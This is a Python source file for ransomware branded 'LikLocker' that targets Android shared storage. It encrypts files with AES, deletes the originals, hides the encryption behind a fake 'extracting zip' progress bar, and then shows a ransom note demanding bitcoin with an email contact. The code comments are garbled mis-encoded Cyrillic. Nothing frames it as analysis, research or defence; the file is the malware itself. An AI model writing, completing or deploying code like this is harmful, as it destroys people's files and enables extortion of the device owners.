import os
import base64
import hashlib
import getpass
from concurrent.futures import ThreadPoolExecutor, as_completed
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
from tqdm import tqdm
import pyfiglet
from termcolor import colored

def generate_key():
    username = getpass.getuser()
    hostname = os.uname()[1]
    unique_string = f"{username}{hostname}"
    return hashlib.sha256(unique_string.encode()).digest()

def encrypt_file(file_path, key):
    cipher = AES.new(key, AES.MODE_CBC)
    with open(file_path, 'rb') as file:
        plaintext = file.read()
    
    if len(plaintext) > 50 * 1024 * 1024:  # Ðàçìåð ôàéëà áîëüøå 50 ÌÁ
        return  # Ïðîïóñêàåì ôàéë áåç âûâîäà îøèáêè

    ciphertext = cipher.encrypt(pad(plaintext, AES.block_size))
    iv = cipher.iv
    
    encrypted_file_path = file_path + '.LikLock'
    
    # Çàïèñü çàøèôðîâàííîãî ôàéëà ñ îòîáðàæåíèåì ïðîãðåññà
    with open(encrypted_file_path, 'wb') as file:
        file.write(iv + ciphertext)

    # Óäàëÿåì îðèãèíàëüíûé ôàéë ïîñëå óñïåøíîãî øèôðîâàíèÿ
    os.remove(file_path)
    
    # Âîçâðàùàåì çàøèôðîâàííîå èìÿ ôàéëà
    base64_encoded_name = base64.b64encode(os.path.basename(file_path).encode()).decode()
    os.rename(encrypted_file_path, os.path.join(os.path.dirname(file_path), base64_encoded_name + '.LikLock'))
    
    return True

def encrypt_directory(directory, key):
    files_to_encrypt = []
    
    # Ñîáèðàåì âñå ôàéëû äëÿ øèôðîâàíèÿ
    for root, _, files in os.walk(directory):
        for filename in files:
            file_path = os.path.join(root, filename)
            if not filename.endswith('.LikLock'):
                files_to_encrypt.append(file_path)

    # Øèôðóåì ôàéëû ñ îòîáðàæåíèåì ïðîãðåññà
    with ThreadPoolExecutor() as executor:
        futures = {executor.submit(encrypt_file, file_path, key): file_path for file_path in files_to_encrypt}
        
        with tqdm(total=len(futures), desc="extracting zip", unit="file") as pbar:
            for future in as_completed(futures):
                file_path = futures[future]
                try:
                    future.result()  # Ïîëó÷àåì ðåçóëüòàò âûïîëíåíèÿ
                    pbar.set_postfix(file=file_path)
                except Exception as e:
                    print(f"Error encrypting {file_path}: {e}")  # Ìîæíî îñòàâèòü äëÿ îòëàäêè, åñëè íåîáõîäèìî
                pbar.update(1)

def display_warning():
    # Î÷èùàåì ýêðàí
    os.system('cls' if os.name == 'nt' else 'clear')

    # Ãåíåðàöèÿ ASCII òåêñòà
    ascii_banner = pyfiglet.figlet_format("LikLocker")
    # Ðàñêðàñêà òåêñòà
    colored_banner = colored(ascii_banner, color='red')
    # Âûâîä íà ýêðàí
    print(colored_banner)

    # Òåêñò ñ ïðåäóïðåæäåíèåì
    warning_text = "Bad news, all your important files have been encrypted by LikLocker ransomware! " \
                   "To decrypt your files, you need to download decryptor. " \
                   "To receive it, you need to send 0.005 BTC to the Bitcoin wallet A728E05dk04gsJ7H " \
                   "and write about successful payment to LikLockerRransomware@gmail.com " \
                   "and wait until they send you decryptor."

    # Îêðóæåíèå òåêñòà òî÷êàìè
    border_length = len(warning_text) + 2  # äëèíà òåêñòà + 2 äëÿ òî÷åê ïî êðàÿì
    border = '.' * border_length  # ðàìêà èç òî÷åê

    # Âûâîä íà ýêðàí
    print(border)
    print(colored(f".{warning_text}.", color='red'))  # òåêñò â ðàìêå
    print(border)

def main():
    directory = '/storage/emulated/0/'  # Óñòàíîâëåííûé ïóòü
    key = generate_key()  # Ãåíåðèðóåì óíèêàëüíûé êëþ÷ äëÿ óñòðîéñòâà
    encrypt_directory(directory, key)
    print("Øèôðîâàíèå çàâåðøåíî.")
    display_warning()

if __name__ == "__main__":
    main()
